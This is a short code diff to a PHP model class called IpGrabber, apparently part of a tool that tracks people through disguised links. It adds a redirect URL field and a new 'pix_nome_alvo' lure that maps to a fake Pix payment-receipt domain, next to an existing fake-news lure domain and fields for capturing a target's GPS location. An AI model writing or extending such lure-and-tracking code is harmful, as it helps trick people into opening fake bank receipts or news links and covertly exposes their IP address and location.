@@ -37,6 +37,7 @@ class IpGrabber extends Model
         'tracking_domain',
         'tracking_channel',
         'mensagem',
+        'redirect_url',
         'noticia_url',
         'capture_gps',
         'capture_alvo',
@@ -130,7 +131,7 @@ class IpGrabber extends Model
         }
 
         return match ($this->preview_tipo) {
-            'pix_bradesco' => 'comprovante-pix.site',
+            'pix_bradesco', 'pix_nome_alvo' => 'comprovante-pix.site',
             'noticia' => 'agenciadanoticia.online',
             default => filled($this->tracking_domain) ? (string) $this->tracking_domain : null,
         };
